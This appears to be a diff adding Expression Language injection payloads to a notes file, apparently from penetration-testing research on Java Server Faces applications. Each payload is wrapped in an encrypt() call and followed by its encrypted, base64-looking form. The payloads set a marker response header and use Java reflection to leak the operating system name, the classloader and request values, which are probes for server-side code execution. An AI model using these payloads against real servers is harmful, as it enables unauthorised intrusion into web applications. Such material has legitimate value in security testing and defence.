@@ -101,3 +101,28 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGp
 4xE5s8AClZxUxmyaZjpBstMXUalIgOJHP5Oh+YKpX0KnV6PfWzIRGzdSpnU3PUUvPm4tuzd2yV6bBcLFnDOSCDJWG4EQ3DXX2nc80PFd4HDL66RIkJCxYepq70Tyx5DweV2kKxrcscfmPrV2M4ogCChuoyEpgxmAkEE9JI7JwNJCUO6XG+GuwmA4HULexo8CtP66rV7LhP6/THyY1WLupIJJLyOy937G1s44wkzrr3E=
 
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70x15PhYprz0n2sxCK4jT+e64dn9jZ2YYaVac8a9wiYIoRah9UI5K/OuPY8Bt1foWlhL0TuPDtFcRd6FLiWVtQ/w=
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", \"\".getClass().forName(\"java.lang.System\").getProperty(\"os.name\"))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe705sIPzvBe0UQUu4nlsuSltDbqmJqtm0nF6Rl3TXuaavQuEe5TdF3PGMchen6kxmtT+sAuIzqvIbxND2GNE4K0OXz7U/24waKbg==
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", 1+2)}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe705Tbg4JDdYBnEzRoYiqs1Zo=
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", header[\"User-Agent\"]) }")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe7061OYRFcIK/ZmXlASQcdDD7hJHbQ4tYPv6Sf5MoSENwG
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", \"\".getClass().forName(\"java.lang.System\").getProperty(\"os.name\"))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe705sIPzvBe0UQUu4nlsuSltDbqmJqtm0nF6Rl3TXuaavQuEe5TdF3PGMchen6kxmtT+sAuIzqvIbxND2GNE4K0OXz7U/24waKbg==
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", \"\".getClass().getClassLoader())}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe705sIPzvBe0UQUu4nlsuSltAVMMqkb70X89L+bQh9E1Q/DA7JSve7mGI=
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", \"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"os.name\"))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe705sIPzvBe0UQUu4nlsuSltDbqmJqtm0nF6Rl3TXuaavQuEe5TdF3PGMchen6kxmtTwHiwU6zvb9N7TL5OliT4RvpUr/TDpl/2n3451m2EpCGpjlkRSkSGU/KK+0c5TxRt1yIENjF2RvKBaWNA8zVYVk=
+
+
+payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"MOGWAILABS\", request.getParameter(\"HOME\"))}")
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe70wyx6PLiQO/w9b7oEINeJj0Ns1GTqtfA9f7nb77a13RX5ZiepQ/XP9o=
